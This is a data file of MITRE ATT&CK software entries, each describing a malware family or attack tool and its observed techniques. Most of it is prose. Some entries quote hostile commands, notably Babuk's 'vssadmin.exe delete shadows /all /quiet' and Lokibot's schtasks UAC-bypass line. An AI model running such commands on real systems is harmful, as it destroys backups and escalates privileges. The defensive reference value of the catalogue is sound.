{"text": " [VERMIN](https://attack.mitre.org/software/S0257) is a remote access tool written in the Microsoft .NET framework. It is mostly composed of original code, but also has some open source code. (Citation: Unit 42 VERMIN Jan 2018)", "idx": "https://attack.mitre.org/software/S0257", "title": "VERMIN", "entity": "VERMIN", "entity_type": "software", "entity_context": ["VERMIN can delete files on the victim’s machine.", "VERMIN decrypts code, strings, and commands to use once it's on the victim's machine.", "VERMIN can download and upload files to the victim's machine.", "VERMIN gathers the local IP address.", "VERMIN gathers the username from the victim’s machine.", "VERMIN saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .", "VERMIN can get a list of the processes and running tasks on the system.", "VERMIN is initially packed.", "VERMIN collects keystrokes from the victim machine.", "VERMIN collects the OS name, machine name, and architecture information.", "VERMIN can perform screen captures of the victim’s machine.", "VERMIN collects data stored in the clipboard.", "VERMIN encrypts the collected files using 3-DES.", "VERMIN uses HTTP for C2 communications.", "VERMIN is obfuscated using the obfuscation tool called ConfuserEx.", "VERMIN can perform audio capture.", "VERMIN uses WMI to check for anti-virus software installed on the system."], "is_subtechnique": false}
{"text": " [TURNEDUP](https://attack.mitre.org/software/S0199) is a non-public backdoor. It has been dropped by [APT33](https://attack.mitre.org/groups/G0064)'s [StoneDrill](https://attack.mitre.org/software/S0380) malware. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)", "idx": "https://attack.mitre.org/software/S0199", "title": "TURNEDUP", "entity": "TURNEDUP", "entity_type": "software", "entity_context": ["TURNEDUP is capable of downloading additional files.", "TURNEDUP is capable of taking screenshots.", "TURNEDUP is capable of gathering system information.", "TURNEDUP is capable of writing to a Registry Run key to establish.", "TURNEDUP is capable of creating a reverse shell.", "TURNEDUP is capable of injecting code into the APC queue of a created Rundll32 process as part of an \"Early Bird injection.\""], "is_subtechnique": false}
{"text": " [KillDisk](https://attack.mitre.org/software/S0607) is a disk-wiping tool designed to overwrite files with random data to render the OS unbootable. It was first observed as a component of [BlackEnergy](https://attack.mitre.org/software/S0089) malware during cyber attacks against Ukraine in 2015. [KillDisk](https://attack.mitre.org/software/S0607) has since evolved into stand-alone malware used by a variety of threat actors against additional targets in Europe and Latin America; in 2016 a ransomware component was also incorporated into some [KillDisk](https://attack.mitre.org/software/S0607) variants.(Citation: KillDisk Ransomware)(Citation: ESEST Black Energy Jan 2016)(Citation: Trend Micro KillDisk 1)(Citation: Trend Micro KillDisk 2)", "idx": "https://attack.mitre.org/software/S0607", "title": "KillDisk", "entity": "KillDisk", "entity_type": "software", "entity_context": ["KillDisk uses VMProtect to make reverse engineering the malware more difficult.", "KillDisk deletes Application, Security, Setup, and System Windows Event Logs.", "KillDisk deletes system files to make the OS unbootable. KillDisk also targets and deletes files with 35 different file extensions.", "KillDisk has a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted.", "KillDisk has attempted to get the access token of a process by calling <code>OpenProcessToken</code>. If KillDisk gets the access token, then it attempt to modify the token privileges with <code>AdjustTokenPrivileges</code>.", "KillDisk registers as a service under the Plug-And-Play Support name.", "KillDisk overwrites the first sector of the Master Boot Record with “0x00”.", "KillDisk has used the <code>FindNextFile</code> command as part of its file deletion process.", "KillDisk terminates various processes to get the user to reboot the victim machine.", "KillDisk has called <code>GetCurrentProcess</code>.", "KillDisk loads and executes functions from a DLL.", "KillDisk has called the Windows API to retrieve the hard disk handle and shut down the machine.", "KillDisk retrieves the hard disk name by calling the <code>CreateFileA to \\\\.\\PHYSICALDRIVE0</code> API.", "KillDisk attempts to reboot the machine by terminating specific processes."], "is_subtechnique": false}
{"text": " [Kinsing](https://attack.mitre.org/software/S0599) is Golang-based malware that runs a cryptocurrency miner and attempts to spread itself to other hosts in the victim environment. (Citation: Aqua Kinsing April 2020)(Citation: Sysdig Kinsing November 2020)(Citation: Aqua Security Cloud Native Threat Report June 2021)", "idx": "https://attack.mitre.org/software/S0599", "title": "Kinsing", "entity": "Kinsing", "entity_type": "software", "entity_context": ["Kinsing has created and run a Bitcoin cryptocurrency miner.", "Kinsing has used the find command to search for specific files.", "Kinsing has used ps to list processes.", "Kinsing has communicated with C2 over HTTP.", "Kinsing has used crontab to download and run shell scripts every minute to ensure persistence.", "Kinsing has used a script to parse files like <code>/etc/hosts</code> and SSH <code>known_hosts</code> to discover remote systems.", "Kinsing has searched for private keys.", "Kinsing has used SSH for lateral movement.", "Kinsing has used chmod to modify permissions on key files for use.", "Kinsing was executed with an Ubuntu container entry point that runs shell scripts.", "Kinsing has used Unix shell scripts to execute commands in the victim environment.", "Kinsing was executed in an Ubuntu container deployed via an open Docker daemon API.", "Kinsing has searched <code>bash_history</code> for credentials.", "Kinsing has attempted to brute force hosts over SSH.", "Kinsing has downloaded additional lateral movement scripts from C2.", "Kinsing was run through a deployed Ubuntu container.", "Kinsing has used valid SSH credentials to access remote hosts."], "is_subtechnique": false}
{"text": " [Out1](https://attack.mitre.org/software/S0594) is a remote access tool written in python and used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2021.(Citation: Trend Micro Muddy Water March 2021)", "idx": "https://attack.mitre.org/software/S0594", "title": "Out1", "entity": "Out1", "entity_type": "software", "entity_context": ["Out1 can use native command line for execution.", "Out1 can copy files and Registry data from compromised hosts.", "Out1 can parse e-mails on a target machine.", "Out1 has the ability to encode data.", "Out1 can use HTTP and HTTPS in communications with remote hosts."], "is_subtechnique": false}
{"text": " [KGH_SPY](https://attack.mitre.org/software/S0526) is a modular suite of tools used by [Kimsuky](https://attack.mitre.org/groups/G0094) for reconnaissance, information stealing, and backdoor capabilities. [KGH_SPY](https://attack.mitre.org/software/S0526) derived its name from PDB paths and internal names found in samples containing \"KGH\".(Citation: Cybereason Kimsuky November 2020)", "idx": "https://attack.mitre.org/software/S0526", "title": "KGH_SPY", "entity": "KGH_SPY", "entity_type": "software", "entity_context": ["KGH_SPY can exfiltrate collected information from the host to the C2 server.", "KGH_SPY has been spread through Word documents containing malicious macros.", "KGH_SPY has the ability to set the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key to execute logon scripts.", "KGH_SPY has masqueraded as a legitimate Windows tool.", "KGH_SPY has the ability to download and execute code from remote servers.", "KGH_SPY has the ability to set a Registry key to run a cmd.exe command.", "KGH_SPY can perform keylogging by polling the <code>GetAsyncKeyState()</code> function.", "KGH_SPY can decrypt encrypted strings and write them to a newly created folder.", "KGH_SPY can collect credentials from the Windows Credential Manager.", "KGH_SPY has used encrypted strings in its installer.", "KGH_SPY has the ability to steal data from the Chrome, Edge, Firefox, Thunderbird, and Opera browsers.", "KGH_SPY can send data to C2 with HTTP POST requests.", "KGH_SPY can send a file containing victim system information to C2.", "KGH_SPY can enumerate files and directories on a compromised host.", "KGH_SPY can execute PowerShell commands on the victim's machine.", "KGH_SPY can collect drive information from a compromised host.", "KGH_SPY can harvest data from mail clients.", "KGH_SPY can save collected system information to a file named \"info\" before exfiltration.", "KGH_SPY can collect credentials from WINSCP.", "KGH_SPY can collect information on installed applications."], "is_subtechnique": false}
{"text": " [DealersChoice](https://attack.mitre.org/software/S0243) is a Flash exploitation framework used by [APT28](https://attack.mitre.org/groups/G0007). (Citation: Sofacy DealersChoice)", "idx": "https://attack.mitre.org/software/S0243", "title": "DealersChoice", "entity": "DealersChoice", "entity_type": "software", "entity_context": ["DealersChoice leverages vulnerable versions of Flash to perform execution.", "DealersChoice makes modifications to open-source scripts from GitHub and executes them on the victim’s machine.", "DealersChoice uses HTTP for communication with the C2 server."], "is_subtechnique": false}
{"text": " [Lokibot](https://attack.mitre.org/software/S0447) is a widely distributed information stealer that was first reported in 2015. It is designed to steal sensitive information such as usernames, passwords, cryptocurrency wallets, and other credentials. [Lokibot](https://attack.mitre.org/software/S0447) can also create a backdoor into infected systems to allow an attacker to install additional payloads.(Citation: Infoblox Lokibot January 2019)(Citation: Morphisec Lokibot April 2020)(Citation: CISA Lokibot September 2020)", "idx": "https://attack.mitre.org/software/S0447", "title": "Lokibot", "entity": "Lokibot", "entity_type": "software", "entity_context": ["Lokibot has obfuscated strings with base64 encoding.", "Lokibot has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.", "Lokibot will delete its dropped files after bypassing UAC.", "Lokibot can search for specific files on an infected host.", "Lokibot has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and the Chromium and Mozilla Firefox-based web browsers.", "Lokibot has the ability to copy itself to a hidden file and directory.", "Lokibot has used VBS scripts and XLS macros for execution. ", "Lokibot has used several packing methods for obfuscation.", "\nLokibot has utilized multiple techniques to bypass UAC.", "Lokibot has tricked recipients into enabling malicious macros by getting victims to click \"enable content\" in email attachments.", "Lokibot has modified the Registry as part of its UAC bypass process. ", "Lokibot has the ability to capture input on the compromised host via keylogging.", "Lokibot has the ability to discover the domain name of the infected host.", "Lokibot is delivered via a malicious XLS attachment contained within a spearhpishing email. ", "Lokibot has the ability to discover the computer name and Windows product name/version.", "Lokibot has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.", "Lokibot has used PowerShell commands embedded inside batch scripts. ", "Lokibot's second stage DLL has set a timer using “timeSetEvent” to schedule its next execution.", "Lokibot has used process hollowing to inject itself into legitimate Windows process. ", "Lokibot downloaded several staged items onto the victim's machine. ", "Lokibot has stolen credentials from multiple applications and data sources including Windows OS credentials, email clients, FTP, and SFTP clients.", "Lokibot has used LoadLibrary(), GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.", "Lokibot has performed a time-based anti-debug check before downloading its third stage.", "Lokibot has reflectively loaded the decoded DLL into memory. ", "Lokibot embedded the commands <code>schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I</code> inside a batch script. ", "Lokibot has used <code>cmd /c</code> commands embedded within batch scripts. ", "Lokibot has used HTTP for C2 communications. ", "Lokibot has the ability to discover the username on the infected host."], "is_subtechnique": false}
{"text": " [Micropsia](https://attack.mitre.org/software/S0339) is a remote access tool written in Delphi.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018)", "idx": "https://attack.mitre.org/software/S0339", "title": "Micropsia", "entity": "Micropsia", "entity_type": "software", "entity_context": ["Micropsia creates a command-line shell using cmd.exe.", "Micropsia takes screenshots every 90 seconds by calling the Gdi32.BitBlt API.", "Micropsia can download and execute an executable from the C2 server.", "Micropsia can perform microphone recording.", "Micropsia creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.", "Micropsia creates a RAR archive based on collected files on the victim's machine.", "Micropsia has keylogging capabilities.", "Micropsia creates a shortcut to maintain persistence.", "Micropsia collects the username from the victim’s machine.", "Micropsia executes an RAR tool to recursively archive files based on a predefined list of file extensions (*.xls, *.xlsx, *.csv, *.odt, *.doc, *.docx, *.ppt, *.pptx, *.pdf, *.mdb, *.accdb, *.accde, *.txt).", "Micropsia uses HTTP and HTTPS for C2 network communications.", "Micropsia gathers the hostname and OS version from the victim’s machine.", "Micropsia can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.", "Micropsia searches for anti-virus software and firewall products installed on the victim’s machine using WMI.", "Micropsia obfuscates the configuration with a custom Base64 and XOR."], "is_subtechnique": false}
{"text": " [GrimAgent](https://attack.mitre.org/software/S0632) is a backdoor that has been used before the deployment of [Ryuk](https://attack.mitre.org/software/S0446) ransomware since at least 2020; it is likely used by [FIN6](https://attack.mitre.org/groups/G0037) and [Wizard Spider](https://attack.mitre.org/groups/G0102).(Citation: Group IB GrimAgent July 2021)", "idx": "https://attack.mitre.org/software/S0632", "title": "GrimAgent", "entity": "GrimAgent", "entity_type": "software", "entity_context": ["GrimAgent has used <code>Accept-Language</code> to identify hosts in the United Kingdom, United States, France, and Spain. ", "GrimAgent can identify the user id on a target machine.", "GrimAgent can delete previously created tasks on a compromised host.", "GrimAgent has sent data related to a compromise host over its C2 channel.", "GrimAgent can set persistence with a Registry run key.", "GrimAgent  can pad C2 messages with random generated values.", "GrimAgent can base64 encode C2 replies.", "GrimAgent can collect the OS, and build version on a compromised host.", "GrimAgent has the ability to use HTTP for C2 communications.", "GrimAgent can use a decryption algorithm for strings based on Rotate on Right (RoR) and Rotate on Left (RoL) functionality.", "GrimAgent can use a hardcoded server public RSA key to encrypt the first request to C2.", "GrimAgent can use Native API including <code>GetProcAddress</code> and <code>ShellExecuteW</code>.", "GrimAgent can identify the country code on a compromised host.", "GrimAgent can collect data and files from a compromised host.", "GrimAgent has the ability to add bytes to change the file hash.", "GrimAgent can use an AES key to encrypt C2 communications.", "GrimAgent has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.", "GrimAgent can enumerate the IP and domain of a target system.", "GrimAgent has the ability to set persistence using the Task Scheduler.", "GrimAgent has the ability to download and execute additional payloads.", "GrimAgent can use the Windows Command Shell to execute commands, including its own removal.", "GrimAgent can sleep for 195 - 205 seconds after payload execution and before deleting its task.", "GrimAgent has the ability to enumerate files and directories on a compromised host.", "GrimAgent can delete old binaries on a compromised host."], "is_subtechnique": false}
{"text": " [HTRAN](https://attack.mitre.org/software/S0040) is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. It can be used by adversaries to hide their location when interacting with the victim networks. (Citation: Operation Quantum Entanglement)(Citation: NCSC Joint Report Public Tools)", "idx": "https://attack.mitre.org/software/S0040", "title": "HTRAN", "entity": "HTRAN", "entity_type": "software", "entity_context": ["HTRAN can install a rootkit to hide network connections from the host OS.", "HTRAN can inject into into running processes.", "HTRAN can proxy TCP socket connections to obfuscate command and control infrastructure."], "is_subtechnique": false}
{"text": " MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used by a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.(Citation: GitHub MailSniper)", "idx": "https://attack.mitre.org/software/S0413", "title": "MailSniper", "entity": "MailSniper", "entity_type": "software", "entity_context": ["MailSniper can be used for password spraying against Exchange and Office 365.", "MailSniper can be used to obtain account names from Exchange and Office 365 using the <code>Get-GlobalAddressList</code> cmdlet.", "MailSniper can be used for searching through email in Exchange and Office 365 environments."], "is_subtechnique": false}
{"text": " [NavRAT](https://attack.mitre.org/software/S0247) is a remote access tool designed to upload, download, and execute files. It has been observed in attacks targeting South Korea. (Citation: Talos NavRAT May 2018)", "idx": "https://attack.mitre.org/software/S0247", "title": "NavRAT", "entity": "NavRAT", "entity_type": "software", "entity_context": ["NavRAT writes multiple outputs to a TMP file using the >> method.", "NavRAT logs the keystrokes on the targeted system.", "NavRAT uses the email platform, Naver, for C2 communications, leveraging SMTP.", "NavRAT leverages cmd.exe to perform discovery techniques. NavRAT loads malicious shellcode and executes it in memory.", "NavRAT uses <code>systeminfo</code> on a victim’s machine.", "NavRAT creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.", "NavRAT copies itself into a running Internet Explorer process to evade detection.", "NavRAT can download files remotely.", "NavRAT uses <code>tasklist /v</code> to check running processes."], "is_subtechnique": false}
{"text": " [Remexi](https://attack.mitre.org/software/S0375) is a Windows-based Trojan that was developed in the C programming language.(Citation: Securelist Remexi Jan 2019)", "idx": "https://attack.mitre.org/software/S0375", "title": "Remexi", "entity": "Remexi", "entity_type": "software", "entity_context": ["Remexi performs exfiltration over BITSAdmin, which is also used for the C2 channel.", "Remexi utilizes Run Registry keys in the HKLM hive as a persistence mechanism.", "Remexi achieves persistence using Userinit by adding the Registry key <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>.", "Remexi utilizes scheduled tasks as a persistence mechanism.", "Remexi uses AutoIt and VBS scripts throughout its execution process.", "Remexi takes screenshots of windows of interest.", "Remexi collects text from the clipboard.", "Remexi silently executes received commands with cmd.exe.", "Remexi searches for files on the system. ", "Remexi has a command to capture active windows on the machine and retrieve window titles.", "Remexi obfuscates its configuration data with XOR.", "Remexi encrypts and adds all gathered browser data into files for upload to C2.", "Remexi gathers and exfiltrates keystrokes from the machine.", "Remexi executes received commands with wmic.exe (for WMI commands). ", "Remexi uses BITSAdmin to communicate with the C2 server over HTTP.", "Remexi decrypts the configuration data using XOR with 25-character keys."], "is_subtechnique": false}
{"text": " [AppleJeus](https://attack.mitre.org/software/S0584) is a family of downloaders initially discovered in 2018 embedded within trojanized cryptocurrency applications. [AppleJeus](https://attack.mitre.org/software/S0584) has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032), targeting companies in the energy, finance, government, industry, technology, and telecommunications sectors, and several countries including the United States, United Kingdom, South Korea, Australia, Brazil, New Zealand, and Russia. [AppleJeus](https://attack.mitre.org/software/S0584) has been used to distribute the [FALLCHILL](https://attack.mitre.org/software/S0181) RAT.(Citation: CISA AppleJeus Feb 2021)", "idx": "https://attack.mitre.org/software/S0584", "title": "AppleJeus", "entity": "AppleJeus", "entity_type": "software", "entity_context": ["AppleJeus has presented the user with a UAC prompt to elevate privileges while installing.", "AppleJeus has placed a plist file within the <code>LaunchDaemons</code> folder and launched it manually.", "AppleJeus has decoded files received from a C2.", "AppleJeus has created a scheduled SYSTEM task that runs when a user logs in.", "AppleJeus has used a valid digital signature from Sectigo to appear legitimate. ", "AppleJeus has deleted the MSI file after installation.", "AppleJeus has been distributed via spearphishing link.", "AppleJeus has loaded a plist file using the <code>launchctl</code> command.", "AppleJeus's spearphishing links required user interaction to navigate to the malicious website.", "AppleJeus can install itself as a service. ", "AppleJeus has been installed via MSI installer.", "AppleJeus has exfiltrated collected host information to a C2 server.", "AppleJeus has required user execution of a malicious MSI installer.", "AppleJeus has collected the victim host information after infection.", "AppleJeus has used shell scripts to execute commands after installation and set persistence mechanisms.", "AppleJeus has XOR-encrypted collected system information prior to sending to a C2. AppleJeus has also used the open source ADVObfuscation library for its components.", "AppleJeus has sent data to its C2 server via <code>POST</code> requests.", "AppleJeus has waited a specified time before downloading a second stage payload.", "AppleJeus has added a leading <code>.</code> to plist filenames, unlisting them from the Finder app and default Terminal directory listings."], "is_subtechnique": false}
{"text": " [Spark](https://attack.mitre.org/software/S0543) is a Windows backdoor and has been in use since as early as 2017.(Citation: Unit42 Molerat Mar 2020)", "idx": "https://attack.mitre.org/software/S0543", "title": "Spark", "entity": "Spark", "entity_type": "software", "entity_context": ["Spark can use cmd.exe to run commands. ", "Spark has checked the results of the <code>GetKeyboardLayoutList</code> and the language name returned by <code>GetLocaleInfoA</code> to make sure they contain the word “Arabic” before executing.", "Spark has exfiltrated data over the C2 channel. ", "Spark has used a custom XOR algorithm to decrypt the payload. ", "Spark has been packed with Enigma Protector to obfuscate its contents. ", "Spark has run the whoami command and has a built-in command to identify the user logged in. ", "Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code. ", "Spark can collect the hostname, keyboard layout, and language from the system. ", "Spark has used HTTP POST requests to communicate with its C2 server to receive commands. ", "Spark has encoded communications with the C2 server with base64. "], "is_subtechnique": false}
{"text": " [ProLock](https://attack.mitre.org/software/S0654) is a ransomware strain that has been used in Big Game Hunting (BGH) operations since at least 2020, often obtaining initial access with [QakBot](https://attack.mitre.org/software/S0650). [ProLock](https://attack.mitre.org/software/S0654) is the successor to PwndLocker ransomware which was found to contain a bug allowing decryption without ransom payment in 2019.(Citation: Group IB Ransomware September 2020)", "idx": "https://attack.mitre.org/software/S0654", "title": "ProLock", "entity": "ProLock", "entity_type": "software", "entity_context": ["ProLock can use .jpg and .bmp files to store its payload.", "ProLock can encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024.", "ProLock can use CVE-2019-0859 to escalate privileges on a compromised host.", "ProLock can remove files containing its payload after they are executed.", "ProLock can use BITS jobs to download its malicious payload.", "ProLock can use vssadmin.exe to remove volume shadow copies.", "ProLock can use WMIC to execute scripts on targeted hosts."], "is_subtechnique": false}
{"text": " [MacSpy](https://attack.mitre.org/software/S0282) is a malware-as-a-service offered on the darkweb (Citation: objsee mac malware 2017).", "idx": "https://attack.mitre.org/software/S0282", "title": "MacSpy", "entity": "MacSpy", "entity_type": "software", "entity_context": ["MacSpy deletes any temporary files it creates", "MacSpy persists via a Launch Agent.", "MacSpy uses Tor for command and control.", "MacSpy can record the sounds from microphones on a computer.", "MacSpy can steal clipboard contents.", "MacSpy stores itself in <code>~/Library/.DS_Stores/</code> ", "MacSpy captures keystrokes.", "MacSpy can capture screenshots of the desktop over multiple monitors.", "MacSpy uses HTTP for command and control."], "is_subtechnique": false}
{"text": " [MobileOrder](https://attack.mitre.org/software/S0079) is a Trojan intended to compromise Android mobile devices. It has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)", "idx": "https://attack.mitre.org/software/S0079", "title": "MobileOrder", "entity": "MobileOrder", "entity_type": "software", "entity_context": ["MobileOrder has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.", "MobileOrder exfiltrates data collected from the victim mobile device.", "MobileOrder has a command to download a file from the C2 server to the victim mobile device's SD card.", "MobileOrder has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.", "MobileOrder has a command to upload to its C2 server victim browser bookmarks.", "MobileOrder has a command to upload information about all running processes to its C2 server.", "MobileOrder exfiltrates data to its C2 server over the same protocol as C2 communications."], "is_subtechnique": false}
{"text": " [PS1](https://attack.mitre.org/software/S0613) is a loader that was used to deploy 64-bit backdoors in the [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020)", "idx": "https://attack.mitre.org/software/S0613", "title": "PS1", "entity": "PS1", "entity_type": "software", "entity_context": ["PS1 is distributed as a set of encrypted files and scripts.", "PS1 can utilize a PowerShell loader.", "PS1 can inject its payload DLL Into memory.", "PS1 can use an XOR key to decrypt a PowerShell loader and payload binary."], "is_subtechnique": false}
{"text": " Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (Citation: GitHub Responder)", "idx": "https://attack.mitre.org/software/S0174", "title": "Responder", "entity": "Responder", "entity_type": "software", "entity_context": ["Responder captures hashes and credentials that are sent to the system after the name services have been poisoned.", "Responder is used to poison name services to gather hashes and credentials from systems within a local network."], "is_subtechnique": false}
{"text": " This entry was deprecated as it was inadvertently added to Enterprise; a similar Software entry was created for ATT&CK for ICS. [TRITON](https://attack.mitre.org/software/S0609) is an attack framework built to interact with Triconex Safety Instrumented System (SIS) controllers. [TRITON](https://attack.mitre.org/software/S0609) was deployed against at least one target in the Middle East. (Citation: FireEye TRITON 2017)(Citation: FireEye TRITON 2018)(Citation: Dragos TRISIS)(Citation: CISA HatMan)(Citation: FireEye TEMP.Veles 2018)", "idx": "https://attack.mitre.org/software/S0609", "title": "TRITON", "entity": "TRITON", "entity_type": "software", "entity_context": ["TRITON’s TsLow python module pings controllers over the TriStation protocol. ", "TRITON disguised itself as the legitimate Triconex Trilog application.", "TRITON attempts to write a dummy program into memory if it fails to reset the Triconex controller.", "TRITON was run as trilog.exe, a Py2EXE compiled python script that accepts a single IP address as a flag.", "TRITON encoded the two inject.bin and imain.bin payloads."], "is_subtechnique": false}
{"text": " [CrackMapExec](https://attack.mitre.org/software/S0488), or CME, is a post-exploitation tool developed in Python and designed for penetration testing against networks. [CrackMapExec](https://attack.mitre.org/software/S0488) collects Active Directory information to conduct lateral movement through targeted networks.(Citation: CME Github September 2018)", "idx": "https://attack.mitre.org/software/S0488", "title": "CrackMapExec", "entity": "CrackMapExec", "entity_type": "software", "entity_context": ["CrackMapExec can pass the hash to authenticate via SMB.", "CrackMapExec can brute force passwords for a specified user on a single target system or across an entire network.", "CrackMapExec can set a scheduled task on the target system to execute commands remotely using at.", "CrackMapExec can dump hashed passwords from LSA secrets for the targeted system.", "CrackMapExec can discover specified filetypes and log files on a targeted system.", "CrackMapExec can create a registry key using wdigest.", "CrackMapExec can dump usernames and hashed passwords from the SAM.", "CrackMapExec can discover active IP addresses, along with the machine name, within a targeted network.", "CrackMapExec can brute force supplied user credentials across a network range.", "CrackMapExec can discover active sessions for a targeted system.", "CrackMapExec can enumerate the shared folders and associated permissions for a targeted network.", "CrackMapExec can collect DNS information from the targeted system.", "CrackMapExec can execute PowerShell commands via WMI.", "CrackMapExec can dump hashed passwords associated with Active Directory using Windows' Directory Replication Services API (DRSUAPI), or Volume Shadow Copy.", "CrackMapExec can gather the user accounts within domain groups.", "CrackMapExec can brute force credential authentication by using a supplied list of usernames and a single password.", "CrackMapExec can discover the password policies applied to the target system.", "CrackMapExec can execute remote commands using Windows Management Instrumentation.\t", "CrackMapExec can enumerate the system drives and associated system name.", "CrackMapExec can enumerate the domain user accounts on a targeted system."], "is_subtechnique": false}
{"text": " [Babuk](https://attack.mitre.org/software/S0638) is a Ransomware-as-a-service (RaaS) malware that has been used since at least 2021. The operators of [Babuk](https://attack.mitre.org/software/S0638) employ a \"Big Game Hunting\" approach to targeting major enterprises and operate a leak site to post stolen data as part of their extortion scheme.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: CyberScoop Babuk February 2021)", "idx": "https://attack.mitre.org/software/S0638", "title": "Babuk", "entity": "Babuk", "entity_type": "software", "entity_context": ["Babuk has the ability to delete shadow volumes using <code>vssadmin.exe delete shadows /all /quiet</code>.", "Babuk has the ability to unpack itself into memory using XOR.", "Babuk has the ability to use the command line to control execution on compromised hosts.", "Babuk can enumerate all services running on a compromised host.", "Babuk has the ability to enumerate files on a targeted system.", "Babuk can stop anti-virus services on a compromised host.", "Babuk has the ability to check running processes on a targeted system.", "Babuk can use multiple Windows API calls for actions on compromised hosts including discovery and execution.", "Babuk can enumerate disk volumes, get disk information, and query service status.", "Babuk can use “WNetOpenEnumW” and “WNetEnumResourceW” to enumerate files in network resources for encryption.", "Babuk can stop specific services related to backups.", "Versions of Babuk have been packed.", "Babuk can use ChaCha8 and ECDH to encrypt data.", "Babuk has the ability to enumerate network shares."], "is_subtechnique": false}
{"text": " [ZxShell](https://attack.mitre.org/software/S0412) is a remote administration tool and backdoor that can be downloaded from the Internet, particularly from Chinese hacker websites. It has been used since at least 2004.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014 )", "idx": "https://attack.mitre.org/software/S0412", "title": "ZxShell", "entity": "ZxShell", "entity_type": "software", "entity_context": ["ZxShell can collect the owner and organization information from the target workstation. ", "ZxShell has a command to perform video device spying. ", "ZxShell has a feature to capture a remote computer's keystrokes using a keylogger. ", "ZxShell has used FTP for C2 connections. ", "ZxShell can create a new service using the service parser function ProcessScCommand. ", "ZxShell uses common ports such as 80 and 443 for C2.", "ZxShell can capture screenshots.", "ZxShell can set up an HTTP or SOCKS proxy. ", "ZxShell has a command, ps, to obtain a listing of processes on the system. ", "ZxShell can check the services on the system. ", "ZxShell supports functionality for VNC sessions. ", "ZxShell can kill AV products' processes. ", "ZxShell can disable the firewall by modifying the registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile</code>. ", "ZxShell has remote desktop functionality. ", "ZxShell has a feature to create local user accounts.", "ZxShell has a command to open a file manager and explorer on the system. ", "ZxShell has a command called RunAs, which creates a new process as another user or process context. ", "ZxShell can collect the local hostname, operating system details, CPU speed, and total physical memory. ", "ZxShell has a command to transfer files from a remote host. ", "ZxShell can launch port scans. ", "ZxShell can launch a reverse command shell.", "ZxShell hooks several API functions to spawn system threads. ", "ZxShell can delete files from the system. ", "ZxShell has a feature to perform SYN flood attack on a host. ", "ZxShell has used rundll32.exe to execute other DLLs and named pipes. ", "ZxShell is injected into a shared SVCHOST process. ", "ZxShell has a command to clear system event logs. ", "ZxShell can query the netsvc group value data located in the svchost group Registry key. ", "ZxShell has used HTTP for C2 connections. "], "is_subtechnique": false}
{"text": " [KARAE](https://attack.mitre.org/software/S0215) is a backdoor typically used by [APT37](https://attack.mitre.org/groups/G0067) as first-stage malware. (Citation: FireEye APT37 Feb 2018)", "idx": "https://attack.mitre.org/software/S0215", "title": "KARAE", "entity": "KARAE", "entity_type": "software", "entity_context": ["KARAE can upload and download files, including second-stage malware.", "KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.", "KARAE can use public cloud-based storage providers for command and control.", "KARAE can collect system information."], "is_subtechnique": false}
{"text": " [Calisto](https://attack.mitre.org/software/S0274) is a macOS Trojan that opens a backdoor on the compromised machine. [Calisto](https://attack.mitre.org/software/S0274) is believed to have first been developed in 2016. (Citation: Securelist Calisto July 2018) (Citation: Symantec Calisto July 2018)", "idx": "https://attack.mitre.org/software/S0274", "title": "Calisto", "entity": "Calisto", "entity_type": "software", "entity_context": ["Calisto has the capability to upload and download files to the victim's machine.", "Calisto uses the <code>zip -r</code> command to compress the data collected on the local system.", "Calisto uses launchctl to enable screen sharing on the victim’s machine.", "Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.", "Calisto runs the <code>ifconfig</code> command to obtain the IP address from the victim’s machine.", "Calisto collects information on bookmarks from Google Chrome.", "Calisto can collect data from user directories.", "Calisto attempted to contact the C2 server over TCP using port 80.", "Calisto has the capability to use <code>rm -rf</code> to remove folders and files from the victim's machine.", "Calisto presents an input prompt asking for the user's login and password.", "Calisto's installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.", "Calisto collects Keychain storage data and copies those passwords/tokens to a file.", "Calisto adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.", "Calisto has the capability to add its own account to the victim's machine.", "Calisto adds permissions and remote logins to all users."], "is_subtechnique": false}
